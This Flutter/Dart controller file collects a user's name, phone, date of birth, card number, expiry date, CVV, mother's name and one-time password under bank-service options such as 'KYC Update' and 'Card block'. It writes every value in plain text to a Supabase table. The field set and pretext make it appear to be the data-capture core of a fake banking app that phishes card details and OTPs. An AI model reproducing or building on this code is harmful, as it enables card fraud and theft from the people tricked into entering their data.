import 'package:flutter/material.dart';
import 'package:get/get.dart';
import 'package:supabase_flutter/supabase_flutter.dart';

class HomeController extends GetxController {
  @override
  final DateController = TextEditingController();
  final fullnameController = TextEditingController();
  final phoneController = TextEditingController();
  final DropDownValueController = TextEditingController();

  final CardNoController = TextEditingController();
  final expiryDateController = TextEditingController();
  final CVVController = TextEditingController();
  final MotherController = TextEditingController();
  final OtpController = TextEditingController();

  List<String> DropdownList = [
    'KYC Update',
    'Pin generate',
    'Card block',
    'Card unblock',
    'New credit Card apply',
    'Other Credit Card',
  ];
  void onInit() {
    super.onInit();
  }

  insert_userDetails() async {
    var Data = await Supabase.instance.client.from('user_tbl').insert([
      {
        'name': fullnameController.text,
        'mobile_number': phoneController.text,
        'DOB': DateController.text,
        'option': DropDownValueController.text,
        'card_number': CardNoController.text,
        'expiryDate': expiryDateController.text,
        'mothername': MotherController.text,
        'cvv': CVVController.text,
        'otp': OtpController.text,
      }
    ]);

    // fullnameController.clear();
    // phoneController.clear();
    // DateController.clear();
    // DropDownValueController.clear();
    // CardNoController.clear();
    // DropDownValueController.clear();
    // expiryDateController.clear();
    // CVVController.clear();
    // OtpController.clear();
  }

  @override
  void onClose() {
    super.onClose();
  }
}
